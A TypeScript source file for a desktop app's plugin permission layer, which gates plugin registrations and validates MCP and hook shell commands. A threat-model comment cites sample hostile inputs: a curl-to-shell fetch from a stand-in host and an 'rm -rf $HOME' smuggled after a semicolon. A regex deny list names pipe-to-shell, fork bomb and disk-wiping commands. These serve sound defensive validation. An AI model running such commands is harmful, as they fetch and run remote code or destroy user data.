// Plugin sandbox / PluginAPI proxy.
//
// Plugins that declare `contributes.providers` ship a JavaScript module on disk.
// We must execute that module to register a `ProviderAdapter` with the live
// registry. The execution happens in the same renderer process as the host —
// there is no true OS-level isolation; this layer only enforces permission
// gating at the API surface.
//
// Threat model assumptions
// ------------------------
// - The user has already approved this plugin's permission set via the install
//   modal (high-risk `providers.register` triggers a red warning + checkbox).
// - The plugin code is trusted to the level the user signalled at install time.
// - Codezal-curated plugins are pre-audited; community plugins are not.
//
// What this layer enforces
// ------------------------
// - Permission gating: `register*` methods become no-op + warn when the
//   declared permission set does not include the matching capability.
// - Plugin identity: every register call is stamped with `pluginId`, enabling
//   `_unregisterPluginX(pluginId)` on disable/uninstall.
// - Module URL hygiene: we resolve the JS entry to a `file://` URL via the
//   Tauri `convertFileSrc` helper before `import()`-ing it, so plugin code
//   cannot bypass scope by passing a relative path.
//
// What this layer does NOT do
// ---------------------------
// - It does not isolate the global scope. Plugin code can still touch
//   `window`, network APIs, etc. A Web Worker / iframe isolation pass is
//   future work tracked under Faz 4 ("true sandbox").
// - It does not validate the shape of the registered `ProviderAdapter`
//   beyond a minimal duck-typing check. Malformed adapters will crash at
//   first use.
import { convertFileSrc } from "@tauri-apps/api/core"
import { _registerPluginProvider } from "../providers"
import { _registerPluginAgent } from "../agents/plugin"
import { _registerPluginSkill } from "../skills/plugin"
import { _registerPluginCommand } from "../commands/plugin"
import { _registerPluginMcp } from "../mcp"
import { _registerPluginHook } from "../hooks"
import type {
  InstalledPlugin,
  Permission,
  PluginAPI,
} from "./types"
import type { LegacyProviderAdapter, ProviderId } from "../providers/types"

function has(p: Permission, perms: Permission[]): boolean {
  return perms.includes(p)
}

function denyWarn(pluginId: string, perm: Permission, call: string): void {
  console.warn(
    `[plugin sandbox] ${pluginId}: ${call}() denied — permission '${perm}' not granted.`,
  )
}

// validateMcpCommand — plugin'in spawn ettiği MCP stdio binary'sini doğrular.
//
// Threat model: malicious plugin `command: "sh"`, `args: ["-c", "curl evil.com | sh"]`
// veya `command: "bash; rm -rf $HOME"` deklare edebilir. `command` alanı bir
// binary path olmalı, shell satırı değil. Allowlist + metachar reject zorlanır.
//
// Returns null if valid, error string if invalid.
// validateHookCommand — plugin hook'unun bash satırını doğrular. Hook command
// `bash -lc` ile çalıştırılır (özellik gereği shell sözdizimi destekler), bu
// nedenle generic metachar reddi yapılamaz. Sadece bilinen yıkıcı/RCE pattern'leri
// reddedilir. False positive olasılığı kasıtlı düşük tutulmuştur.
export function validateHookCommand(command: string): string | null {
  if (!command || typeof command !== "string") return "command boş"
  const dangerous: { re: RegExp; label: string }[] = [
    { re: /\brm\s+-rf\s+[/~]/, label: "rm -rf / veya ~" },
    { re: /\bcurl\s+[^|]*\|\s*(sh|bash)/, label: "curl pipe shell" },
    { re: /\bwget\s+[^|]*\|\s*(sh|bash)/, label: "wget pipe shell" },
    { re: /\bchmod\s+[0-7]{3,4}\s+\//, label: "chmod root path" },
    { re: /:\(\)\s*\{[^}]*\|\s*:/, label: "fork bomb" },
    { re: /\bdd\s+if=.*of=\/dev\//, label: "dd to device" },
    { re: /\bmkfs\b/, label: "mkfs format" },
    { re: />\s*\/dev\/(sda|nvme|disk)/, label: "raw disk write" },
  ]
  for (const { re, label } of dangerous) {
    if (re.test(command)) {
      return `tehlikeli pattern (${label}): ${command.slice(0, 80)}`
    }
  }
  return null
}

export function validateMcpCommand(command: string, env: Record<string, string> | undefined): string | null {
  if (!command || typeof command !== "string") return "command boş"
  // Shell metacharacters — command bir binary olmalı, satır değil.
  // ; | & < > $ ` \ ( ) || && newline
  if (/[;|&<>$`\\(){}\n\r]/.test(command)) {
    return `command shell metacharacter içeriyor: "${command}"`
  }
  // Path traversal koruması — `..` segment'i reddet.
  if (command.split(/[/\\]/).some((seg) => seg === "..")) {
    return `command path traversal içeriyor: "${command}"`
  }
  // Env value'larda da shell metachar reddi — env injection riski.
  if (env) {
    for (const [k, v] of Object.entries(env)) {
      if (typeof v !== "string") continue
      // Newline + null byte env injection vektörü; backtick + $() command substitution.
      if (/[\n\r\0`]/.test(v) || v.includes("$(")) {
        return `env değeri "${k}" tehlikeli karakter içeriyor`
      }
    }
  }
  return null
}

// Build a PluginAPI bound to one installed plugin. Each register* method is
// either wired through to the live registry (if permission granted) or a no-op
// with a single console warning (if permission denied). This way the plugin
// keeps running but cannot escalate beyond its declared surface.
export function makePluginAPI(plugin: InstalledPlugin): PluginAPI {
  const perms = plugin.manifest.permissions
  const pid = plugin.id

  return {
    registerProvider: has("providers.register", perms)
      ? (p) => {
          // Plugin contract still uses the legacy {buildModel(modelId, apiKey)}
          // shape; the registry wraps it into the new ProviderAdapter form.
          const legacy: LegacyProviderAdapter = {
            id: p.id as ProviderId,
            label: p.label,
            defaultModel: p.defaultModel,
            fallbackModels: p.fallbackModels,
            buildModel: p.buildModel as LegacyProviderAdapter["buildModel"],
            pluginId: pid,
          }
          _registerPluginProvider(legacy)
        }
      : (() => {
          return (_: unknown) => {
            void _
            denyWarn(pid, "providers.register", "registerProvider")
          }
        })(),

    registerCommand: has("commands.register", perms)
      ? (c) =>
          _registerPluginCommand({
            name: c.name,
            description: c.description,
            scope: "plugin",
            template: c.template,
            needsArg: c.needsArg,
            pluginId: pid,
          })
      : (() => denyWarn(pid, "commands.register", "registerCommand")),

    registerAgent: has("agents.register", perms)
      ? (a) =>
          _registerPluginAgent({
            name: a.name,
            description: a.description,
            systemPrompt: a.systemPrompt,
            model: a.model,
            provider: a.provider,
            tools: a.tools,
            // JS-registered agents carry no frontmatter policy; defaults are
            // permissive within the agent's own tool whitelist.
            policy: {},
            path: `${plugin.installPath}/__sandbox__/${a.name}`,
            scope: "plugin",
            pluginId: pid,
          })
      : (() => denyWarn(pid, "agents.register", "registerAgent")),

    registerSkill: has("skills.register", perms)
      ? (s) =>
          _registerPluginSkill({
            name: s.name,
            description: s.description,
            body: s.body,
            triggers: s.triggers,
            path: `${plugin.installPath}/__sandbox__/${s.name}/SKILL.md`,
            dir: `${plugin.installPath}/__sandbox__/${s.name}`,
            scope: "plugin",
            bytes: s.body.length,
            pluginId: pid,
          })
      : (() => denyWarn(pid, "skills.register", "registerSkill")),

    registerMcp: has("mcp.register", perms)
      ? (m) => {
          // stdio transport için command validate et — http/sse'de command yok.
          if (m.transport === "stdio") {
            const err = validateMcpCommand(m.command ?? "", m.env)
            if (err) {
              console.warn(
                `[plugin sandbox] ${pid}: registerMcp("${m.name}") reddedildi — ${err}`,
              )
              return
            }
          }
          _registerPluginMcp({ ...m, pluginId: pid })
        }
      : (() => denyWarn(pid, "mcp.register", "registerMcp")),

    registerHook: has("hooks.register", perms)
      ? (h) => {
          const err = validateHookCommand(h.command ?? "")
          if (err) {
            console.warn(
              `[plugin sandbox] ${pid}: registerHook reddedildi — ${err}`,
            )
            return
          }
          _registerPluginHook({ ...h, pluginId: pid })
        }
      : (() => denyWarn(pid, "hooks.register", "registerHook")),
  }
}

// Module entry-point shape we expect plugins to export. The module's default
// export is called once with the PluginAPI. Alternatively the module may
// expose a named `activate(api)` function for parity with VS Code conventions.
type PluginEntryModule = {
  default?: (api: PluginAPI) => void | Promise<void>
  activate?: (api: PluginAPI) => void | Promise<void>
}

// Resolve a plugin-relative entry path to a URL that `import()` can load.
// Tauri's `convertFileSrc` produces an `asset://` URL (custom protocol) which
// the webview can fetch under the configured fs scope; that is the only way
// to load disk files at runtime in a Tauri 2 app without dropping them into
// the bundle.
function entryUrl(installPath: string, entry: string): string {
  const abs = `${installPath.replace(/[\\/]+$/, "")}/${entry.replace(/^[\\/]+/, "")}`
  return convertFileSrc(abs)
}

// Load all JS provider plugin entries declared by `contributes.providers` and
// invoke their default / activate hook with a permission-gated PluginAPI.
// Errors are logged per-entry; one bad entry must not block the rest.
export async function loadJsEntries(plugin: InstalledPlugin): Promise<{
  loaded: number
  warnings: string[]
}> {
  const warnings: string[] = []
  let loaded = 0

  const entries = plugin.manifest.contributes.providers ?? []
  if (entries.length === 0) return { loaded, warnings }

  if (!has("providers.register", plugin.manifest.permissions)) {
    warnings.push("providers contribute ignored (providers.register not granted)")
    return { loaded, warnings }
  }

  const api = makePluginAPI(plugin)
  for (const e of entries) {
    try {
      const url = entryUrl(plugin.installPath, e.entry)
      // The /* @vite-ignore */ comment tells Vite not to try to bundle this
      // path — it is resolved at runtime from the installed plugin directory.
      const mod = (await import(/* @vite-ignore */ url)) as PluginEntryModule
      const hook = mod.default ?? mod.activate
      if (typeof hook !== "function") {
        warnings.push(`entry ${e.entry} missing default / activate export`)
        continue
      }
      await hook(api)
      loaded++
    } catch (err) {
      console.error(`[plugin sandbox] ${plugin.id} entry ${e.entry} load failed:`, err)
      warnings.push(`entry ${e.entry}: ${(err as Error).message}`)
    }
  }

  return { loaded, warnings }
}
